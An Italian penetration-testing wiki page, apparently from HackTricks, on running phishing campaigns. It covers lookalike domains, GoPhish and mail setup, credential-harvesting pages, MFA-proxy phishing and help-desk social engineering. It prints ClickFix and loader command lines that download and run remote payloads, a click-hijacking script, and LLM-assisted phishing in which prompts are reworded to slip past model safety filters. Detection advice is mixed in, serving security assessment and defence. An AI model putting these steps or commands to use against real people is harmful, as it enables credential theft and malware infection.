# Metodologia di Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Ricognizione della vittima
1. Selezionare il **dominio della vittima**.
2. Eseguire una basic web enumeration **cercando i portali di login** utilizzati dalla vittima e **decidere** quale si intende **impersonare**.
3. Utilizzare l'**OSINT** per **trovare gli indirizzi email**.
2. Preparare l'ambiente
1. **Acquistare il dominio** che si intende utilizzare per il phishing assessment
2. **Configurare i record** correlati al servizio email (SPF, DMARC, DKIM, rDNS)
3. Configurare il VPS con **gophish**
3. Preparare la campagna
1. Preparare il **template email**
2. Preparare la **pagina web** per rubare le credenziali
4. Avviare la campagna!

## Generare nomi di dominio simili o acquistare un dominio affidabile

### Tecniche di variazione del nome di dominio

- **Keyword**: Il nome di dominio **contiene una **keyword** importante** del dominio originale (ad es., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **sottodominio con trattino**: Sostituire il **punto con un trattino** in un sottodominio (ad es., www-zelster.com).
- **Nuovo TLD**: Stesso dominio utilizzando un **nuovo TLD** (ad es., zelster.org)
- **Homoglyph**: **Sostituisce** una lettera nel nome di dominio con **lettere dall'aspetto simile** (ad es., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Scambia due lettere** all'interno del nome di dominio (ad es., zelsetr.com).
- **Singularization/Pluralization**: Aggiunge o rimuove la “s” alla fine del nome di dominio (ad es., zeltsers.com).
- **Omission**: **Rimuove una** delle lettere dal nome di dominio (ad es., zelser.com).
- **Repetition:** **Ripete una** delle lettere nel nome di dominio (ad es., zeltsser.com).
- **Replacement**: Come Homoglyph, ma meno stealthy. Sostituisce una delle lettere nel nome di dominio, magari con una lettera vicina a quella originale sulla tastiera (ad es., zektser.com).
- **Subdomained**: Inserisce un **punto** all'interno del nome di dominio (ad es., ze.lster.com).
- **Insertion**: **Inserisce una lettera** nel nome di dominio (ad es., zerltser.com).
- **Missing dot**: Aggiunge il TLD al nome di dominio (ad es., zelstercom.com)

**Strumenti automatici**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Siti web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Esiste la **possibilità che alcuni bit memorizzati o in fase di comunicazione possano essere modificati automaticamente** a causa di vari fattori, come brillamenti solari, raggi cosmici o errori hardware.

Quando questo concetto viene **applicato alle richieste DNS**, è possibile che il **dominio ricevuto dal server DNS** non sia lo stesso richiesto inizialmente.

Ad esempio, una singola modifica di bit nel dominio "windows.com" può trasformarlo in "windnws.com."

Gli attaccanti possono **sfruttare questa situazione registrando più domini bit-flipping** simili al dominio della vittima. Il loro obiettivo è reindirizzare gli utenti legittimi verso la propria infrastruttura.

Per ulteriori informazioni, leggere [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Acquistare un dominio affidabile

È possibile cercare su [https://www.expireddomains.net/](https://www.expireddomains.net) un dominio scaduto da utilizzare.\
Per assicurarsi che il dominio scaduto che si intende acquistare **abbia già un buon SEO**, è possibile verificarne la categorizzazione su:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Scoprire gli indirizzi email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Per **scoprire più indirizzi email** validi o **verificare quelli** già scoperti, è possibile controllare se si possono sottoporre a brute-force i server SMTP della vittima. [Scopri qui come verificare/scoprire gli indirizzi email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Inoltre, non dimenticare che, se gli utenti utilizzano **un qualsiasi portale web per accedere alle proprie email**, è possibile verificare se sia vulnerabile al **username brute force** e sfruttare la vulnerabilità, se possibile.

## Configurazione di GoPhish

### Installazione

È possibile scaricarlo da [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Scaricarlo e decomprimerlo all'interno di `/opt/gophish`, quindi eseguire `/opt/gophish/gophish`\
Nell'output verrà fornita una password per l'utente admin sulla porta 3333. Accedere quindi a quella porta e utilizzare tali credenziali per modificare la password admin. Potrebbe essere necessario eseguire il tunnel di quella porta verso local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configurazione

**Configurazione del certificato TLS**

Prima di questo passaggio dovresti **aver già acquistato il dominio** che utilizzerai, e questo deve **puntare** all'**IP del VPS** in cui stai configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configurazione della posta**

Inizia installando: `apt-get install postfix`

Quindi aggiungi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifica inoltre i valori delle seguenti variabili all'interno di /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine modifica i file **`/etc/hostname`** e **`/etc/mailname`** impostandoli sul nome del tuo dominio e **riavvia il tuo VPS.**

Ora crea un **record DNS A** per `mail.<domain>` che punti all'**indirizzo IP** del VPS e un **record DNS MX** che punti a `mail.<domain>`

Ora proviamo a inviare un'email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configurazione di Gophish**

Interrompi l’esecuzione di Gophish e configuriamolo.\
Modifica `/opt/gophish/config.json` come segue (nota l’uso di https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configura il servizio gophish**

Per creare il servizio gophish in modo che possa essere avviato automaticamente e gestito come servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Termina di configurare il servizio e verifica che funzioni eseguendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurazione del mail server e del dominio

### Aspetta e sii legittimo

Più un dominio è vecchio, meno è probabile che venga rilevato come spam. Dovresti quindi aspettare il più a lungo possibile (almeno 1 settimana) prima del phishing assessment. Inoltre, se inserisci una pagina relativa a un settore con una buona reputazione, la reputazione ottenuta sarà migliore.

Tieni presente che, anche se devi aspettare una settimana, puoi completare ora tutta la configurazione.

### Configura il record Reverse DNS (rDNS)

Imposta un record rDNS (PTR) che risolva l'indirizzo IP del VPS nel nome di dominio.

### Record Sender Policy Framework (SPF)

Devi **configurare un record SPF per il nuovo dominio**. Se non sai cos'è un record SPF, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua policy SPF (usa l'IP della macchina VPS)

![Modulo SPF Wizard per generare un record SPF per un dominio di phishing](<../../images/image (1037).png>)

Questo è il contenuto che deve essere impostato all'interno di un record TXT nel dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Record DMARC (Domain-based Message Authentication, Reporting & Conformance)

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT che punti all'hostname `_dmarc.<domain>` con il seguente contenuto:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cos'è un record DMARC [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial è basato su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Devi concatenare entrambi i valori B64 generati dalla chiave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testa il punteggio della configurazione email

Puoi farlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accedi semplicemente alla pagina e invia un'email all'indirizzo che ti viene fornito:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Puoi anche **verificare la configurazione della posta elettronica** inviando un'email a `check-auth@verifier.port25.com` e **leggendo la risposta** (per farlo dovrai **aprire** la porta **25** e visualizzare la risposta nel file _/var/mail/root_ se invii l'email come root).\
Verifica di superare tutti i test:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Potresti anche inviare un **messaggio a un account Gmail sotto il tuo controllo** e controllare le **intestazioni dell’email** nella tua posta in arrivo Gmail: `dkim=pass` dovrebbe essere presente nel campo dell’intestazione `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Rimozione dalla blacklist di Spamhouse

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicarti se il tuo dominio è bloccato da spamhouse. Puoi richiedere la rimozione del tuo dominio/IP all'indirizzo: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Rimozione dalla blacklist di Microsoft

​​Puoi richiedere la rimozione del tuo dominio/IP all'indirizzo [https://sender.office.com/](https://sender.office.com).

## Creazione e avvio di una campagna GoPhish

### Profilo di invio

- Imposta un **nome per identificare** il profilo del mittente
- Decidi da quale account inviare le email di phishing. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti username e password, ma assicurati di selezionare Ignore Certificate Errors

![Creazione e avvio di una campagna GoPhish - Profilo di invio: puoi lasciare vuoti username e password, ma assicurati di selezionare Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> È consigliato usare la funzionalità "**Send Test Email**" per verificare che tutto funzioni.\
> Ti consiglio di **inviare le email di test a indirizzi email 10min mails** per evitare di essere inserito nella blacklist durante i test.

### Modello email

- Imposta un **nome per identificare** il modello
- Quindi scrivi un **oggetto** (niente di strano, solo qualcosa che ti aspetteresti di leggere in una normale email)
- Assicurati di aver selezionato "**Add Tracking Image**"
- Scrivi il **modello email** (puoi usare variabili come nell'esempio seguente):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Nota che **per aumentare la credibilità dell'email**, è consigliabile utilizzare qualche firma proveniente da un'email del cliente. Suggerimenti:

- Invia un'email a un **indirizzo inesistente** e verifica se la risposta contiene una firma.
- Cerca **email pubbliche** come info@ex.com, press@ex.com o public@ex.com, invia loro un'email e attendi la risposta.
- Prova a contattare qualche indirizzo email **valido individuato** e attendi la risposta

![Sending Profile - Email Template: Prova a contattare qualche indirizzo email valido individuato e attendi la risposta](<../../images/image (80).png>)

> [!TIP]
> L'Email Template consente anche di **allegare file da inviare**. Se vuoi anche sottrarre challenge NTLM utilizzando file/documenti appositamente creati [leggi questa pagina](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Inserisci un **nome**
- **Scrivi il codice HTML** della pagina web. Nota che puoi **importare** pagine web.
- Seleziona **Capture Submitted Data** e **Capture Passwords**
- Imposta un **reindirizzamento**

![Email Template - Landing Page: Seleziona Capture Submitted Data e Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina ed effettuare alcuni test in locale (magari utilizzando un server Apache) **finché non sarai soddisfatto del risultato.** Quindi, inserisci quel codice HTML nel riquadro.\
> Nota che, se devi **utilizzare risorse statiche** per l'HTML (magari alcune pagine CSS e JS), puoi salvarle in _**/opt/gophish/static/endpoint**_ e poi accedervi da _**/static/\<filename>**_

> [!TIP]
> Per il reindirizzamento potresti **reindirizzare gli utenti alla pagina web principale legittima** della vittima oppure, ad esempio, reindirizzarli a _/static/migration.html_, inserire una **rotella di caricamento (**[**https://loading.io/**](https://loading.io)**) per 5 secondi e poi indicare che il processo è stato completato con successo**.

### Users & Groups

- Imposta un nome
- **Importa i dati** (nota che, per utilizzare il template dell'esempio, sono necessari il nome, il cognome e l'indirizzo email di ogni utente)

![Landing Page - Users & Groups: Importa i dati (nota che, per utilizzare il template dell'esempio, sono necessari il nome, il cognome e l'indirizzo email di ogni utente)](<../../images/image (163).png>)

### Campaign

Infine, crea una campagna selezionando un nome, l'email template, la landing page, l'URL, il sending profile e il gruppo. Nota che l'URL sarà il link inviato alle vittime.

Nota che il **Sending Profile consente di inviare un'email di test per verificare come apparirà l'email di phishing finale**:

![Users & Groups - Campaign: Nota che il Sending Profile consente di inviare un'email di test per verificare come apparirà l'email di phishing finale](<../../images/image (192).png>)

Quando tutto è pronto, avvia semplicemente la campagna!

## Website Cloning

Se per qualsiasi motivo vuoi clonare il sito web, consulta la pagina seguente:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In alcune valutazioni di phishing (principalmente per Red Team) potresti voler anche **inviare file contenenti una qualche forma di backdoor** (magari un C2 o semplicemente qualcosa che attivi un'autenticazione).\
Consulta la pagina seguente per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attacco precedente è piuttosto ingegnoso, poiché simuli un sito web reale e raccogli le informazioni inserite dall'utente. Sfortunatamente, se l'utente non ha inserito la password corretta o se l'applicazione che hai simulato è configurata con 2FA, **queste informazioni non ti permetteranno di impersonare l'utente ingannato**.

È qui che strumenti come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) sono utili. Questo strumento consente di generare un attacco simile a un MitM. In sostanza, gli attacchi funzionano nel modo seguente:

1. **Impersoni il modulo di login** della pagina web reale.
2. L'utente **invia** le proprie **credenziali** alla tua pagina fake e lo strumento le invia alla pagina web reale, **verificando se le credenziali funzionano**.
3. Se l'account è configurato con **2FA**, la pagina MitM la richiederà e, una volta che l'**utente la inserisce**, lo strumento la invierà alla pagina web reale.
4. Una volta autenticato l'utente, tu, in qualità di attaccante, avrai **catturato le credenziali, la 2FA, il cookie e qualsiasi informazione** relativa a ogni interazione effettuata mentre lo strumento esegue un MitM.

### Via VNC

Cosa succederebbe se, invece di **inviare la vittima a una pagina malevola** con lo stesso aspetto dell'originale, la inviassi a una **sessione VNC con un browser connesso alla pagina web reale**? Potresti vedere ciò che fa, sottrarre la password, la MFA utilizzata, i cookie...\
Puoi farlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Ovviamente, uno dei modi migliori per sapere se sei stato scoperto è **cercare il tuo dominio all'interno delle blacklist**. Se compare nell'elenco, in qualche modo il tuo dominio è stato rilevato come sospetto.\
Un modo semplice per verificare se il tuo dominio compare in una blacklist consiste nell'utilizzare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, esistono altri modi per sapere se la vittima sta **cercando attivamente attività di phishing sospette in circolazione**, come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

Puoi **acquistare un dominio con un nome molto simile** a quello del dominio della vittima **e/o generare un certificato** per un **sottodominio** di un dominio controllato da te, che **contenga** la **keyword** del dominio della vittima. Se la **vittima** esegue qualsiasi tipo di **interazione DNS o HTTP** con essi, saprai che sta **cercando attivamente** domini sospetti e dovrai essere molto furtivo.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious)per valutare se la tua email finirà nella cartella spam, se verrà bloccata oppure se avrà successo.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

I moderni intrusion set evitano sempre più spesso le esche email e **mirano direttamente al workflow del service desk / recupero dell'identità** per aggirare la MFA. L'attacco è completamente "living-off-the-land": una volta ottenute credenziali valide, l'operatore si sposta utilizzando strumenti di amministrazione integrati: non è richiesto alcun malware.<sup>[[6]](#references)</sup>

### Attack flow
1. Ricognizione sulla vittima
* Raccogli dettagli personali e aziendali da LinkedIn, data breach, GitHub pubblico, ecc.
* Identifica le identità di alto valore (dirigenti, IT, finance) ed enumera l'**esatto processo dell'help desk** per il reset della password / MFA.
2. Social engineering in tempo reale
* Telefona, contatta via Teams o chatta con l'help desk impersonando il bersaglio (spesso con **caller-ID falsificato** o **voce clonata**).
* Fornisci i dati PII raccolti in precedenza per superare la verifica basata sulla conoscenza.
* Convincere l'operatore a **reimpostare il secret MFA** o a eseguire un **SIM-swap** sul numero di cellulare registrato.
3. Azioni immediate successive all'accesso (≤60 min nei casi reali)
* Stabilisci un foothold attraverso qualsiasi portale web SSO.
* Enumera AD / AzureAD con strumenti integrati (senza depositare binari):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Esegui il movimento laterale con **WMI**, **PsExec** o agent **RMM** legittimi già autorizzati nell'ambiente.

### Detection & Mitigation
* Tratta il recupero dell'identità tramite help desk come un'**operazione privilegiata**: richiedi step-up auth e l'approvazione del manager.
* Implementa regole di **Identity Threat Detection & Response (ITDR)** / **UEBA** che generino un avviso per:
* Modifica del metodo MFA + autenticazione da un nuovo dispositivo / posizione geografica.
* Immediata elevazione dello stesso principal (user-→-admin).
* Registra le chiamate all'help desk e imponi una **richiamata a un numero già registrato** prima di qualsiasi reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** in modo che gli account appena reimpostati **non ereditino automaticamente token con privilegi elevati**.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
I gruppi criminali comuni compensano il costo delle operazioni ad alto contatto con attacchi su larga scala che trasformano **i motori di ricerca e le reti pubblicitarie nel canale di distribuzione**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** porta in cima agli annunci di ricerca un risultato falso come `chromium-update[.]site`.
2. La vittima scarica un piccolo **first-stage loader** (spesso JS/HTA/ISO). Esempi osservati da Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Il loader esfiltra cookie del browser e database delle credenziali, quindi scarica un **silent loader** che decide, *in realtime*, se distribuire:
* RAT (ad es. AsyncRAT, RustDesk)
* ransomware / wiper
* componente di persistenza (chiave Run del registro + attività pianificata)

### Hardening tips
* Blocca i domini registrati di recente e applica **Advanced DNS / URL Filtering** anche agli *search ads*, oltre che alle email.
* Limita l'installazione del software ai pacchetti MSI firmati / Store e nega l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitora i processi child dei browser che aprono installer:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Cerca i LOLBins frequentemente abusati dai first-stage loader (ad es. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Alcuni portali software falsi mantengono l'`href` di download visibile indirizzato all'URL **reale** di GitHub/release, ma dirottano la **prima** interazione dell'utente in JavaScript e inviano invece la vittima a una catena di **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Tratti chiave:
- L’hook viene solitamente eseguito nella **capture phase** (`true`) su `document`, quindi si attiva prima degli handler del sito.
- Chrome utilizza spesso `mousedown` invece di `click` per mantenere il redirect associato a un valido **user gesture** e migliorare l’elusione dei popup blocker.
- Alcune varianti aprono preventivamente `about:blank` o sintetizzano click su `<a target="_blank">`, assegnando l’URL del TDS solo in seguito.
- I limiti lato browser si trovano comunemente in `localStorage`, quindi il **primo click** può raggiungere il malware, mentre refresh/retry successivi ricadono sul link visibile dall’aspetto benigno.
- Il TDS può applicare filtri in base a referrer, dominio di ingresso, GEO, fingerprint del browser/dispositivo, controlli VPN/datacenter, contesto del click e contatori per sessione, rendendo i replay dell’analista non deterministici.

Idee per i defender:
- Confrontare l’`href` **visualizzato** con il target di navigazione **effettivo** generato al momento del click.
- Cercare handler `document.addEventListener(..., true)` che chiamano sia `preventDefault()` sia `stopImmediatePropagation()` in prossimità di `window.open`, `about:blank` o click sintetici su anchor.
- Considerare i cluster di domini software-download registrati di recente che caricano tutti lo stesso stage CloudFront/JS come un pattern ad alta affidabilità di SEO-poisoning/TDS.

### ClickFix da fake verification pages + fetch di archivi tramite LOLBAS
Alcuni rami del TDS terminano in una fake verification page (in stile Cloudflare/IUAM) che indica alla vittima di eseguire un trusted Windows binary come:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Note:
- `mshta.exe` esegue **HTA/VBScript all'inizio della risposta**, anche se l'URL finge di puntare a un archivio `.7z`; i dati dell'archivio aggiunti possono essere un puro diversivo.
- Gli stage successivi spesso continuano a mentire sul tipo di file (`.rtf` per PowerShell, `.asar` per Python, ZIP con binari imbottiti) per poi passare al **manual PE mapping / in-memory execution**.
- Se stai analizzando una di queste catene, conserva **rete + memoria dalla prima esecuzione riuscita**: i replay successivi potrebbero mostrare solo un percorso benigno con installer/SFX oppure fallire perché il rilascio del payload/chiave era associato alla sessione TDS originale.

### Tradecraft di distribuzione di DLL ClickFix (finto aggiornamento CERT)
* Esca: advisory CERT nazionale clonato con un pulsante **Update** che mostra istruzioni dettagliate per la “correzione”. Alle vittime viene detto di eseguire un batch che scarica una DLL e la esegue tramite `rundll32`.<sup>[[12]](#references)</sup>
* Tipica catena batch osservata:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` deposita il payload in `%TEMP%`, una breve pausa nasconde il jitter di rete, quindi `rundll32` chiama l'entrypoint esportato (`notepad`).
* La DLL invia beacon con l'identità dell'host e interroga il C2 ogni pochi minuti. Il tasking remoto arriva come **PowerShell codificato in base64**, eseguito in modalità nascosta e con bypass delle policy:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Questo mantiene la flessibilità del C2 (il server può sostituire i task senza aggiornare la DLL) e nasconde le finestre della console. Cerca processi PowerShell figli di `rundll32.exe` che utilizzano insieme `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* I difensori possono cercare callback HTTP(S) nella forma `...page.php?tynor=<COMPUTER>sss<USER>` e intervalli di polling di 5 minuti dopo il caricamento della DLL.

---

## Operazioni di phishing potenziate dall'AI
Gli attaccanti ora concatenano **API LLM e di voice-cloning** per esche completamente personalizzate e interazioni in tempo reale.

| Livello | Esempio di utilizzo da parte dell'attore della minaccia |
|-------|-------------|
|Automation|Generare e inviare >100.000 email / SMS con formulazioni randomizzate e link di tracking.|
|Generative AI|Produrre email *one-off* che fanno riferimento a operazioni M&A pubbliche e battute interne ricavate dai social media; utilizzare la voce deep-fake del CEO in una truffa tramite callback.|
|Agentic AI|Registrare autonomamente domini, raccogliere informazioni da fonti OSINT e creare email dello stage successivo quando una vittima fa clic ma non invia le credenziali.|

**Difesa:**
• Aggiungere **banner dinamici** che evidenzino i messaggi inviati da sistemi di automation non attendibili (tramite anomalie ARC/DKIM).
• Implementare **frasi di verifica vocali biometriche** per le richieste telefoniche ad alto rischio.
• Simulare continuamente esche generate dall'AI nei programmi di sensibilizzazione: i template statici sono obsoleti.

Vedi anche – abuso della navigazione agentic per il credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Vedi anche – abuso da parte degli AI agent degli strumenti CLI locali e di MCP (per l'inventario e il rilevamento dei segreti):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblaggio runtime di JavaScript per il phishing assistito da LLM (codegen nel browser)

Gli attaccanti possono distribuire HTML dall'aspetto benigno e **generare lo stealer a runtime** chiedendo JavaScript a una **trusted LLM API**, per poi eseguirlo nel browser (ad esempio con `eval` o uno `<script>` dinamico).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** codificare gli URL di exfil e le stringhe Base64 nel prompt; iterare la formulazione per aggirare i filtri di sicurezza e ridurre le allucinazioni.
2. **Client-side API call:** al caricamento, JS chiama un LLM pubblico (Gemini/DeepSeek/ecc.) o un proxy CDN; nell'HTML statico sono presenti solo il prompt e la chiamata API.
3. **Assemble & exec:** concatenare la risposta ed eseguirla (polimorfica a ogni visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** il codice generato personalizza l'esca (ad es., il parsing del token LogoKit) e invia le credenziali all'endpoint nascosto nel prompt.

**Tratti di elusione**
- Il traffico raggiunge domini LLM noti o proxy CDN affidabili; talvolta passa tramite WebSockets verso un backend.
- Nessun payload statico; il codice JS malevolo esiste solo dopo il rendering.
- Le generazioni non deterministiche producono **stealer unici** per ogni sessione.

**Idee per il rilevamento**
- Eseguire sandbox con JS abilitato; segnalare **`eval` a runtime/creazione dinamica di script originata da risposte LLM**.
- Cercare POST dal front-end verso API LLM seguite immediatamente da `eval`/`Function` sul testo restituito.
- Generare un alert per domini LLM non autorizzati nel traffico client, seguiti da POST successivi di credenziali.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Oltre al classico push-bombing, gli operatori semplicemente **forzano una nuova registrazione MFA** durante la chiamata all'help desk, invalidando il token esistente dell'utente. Qualsiasi richiesta di accesso successiva appare legittima alla vittima.
```text
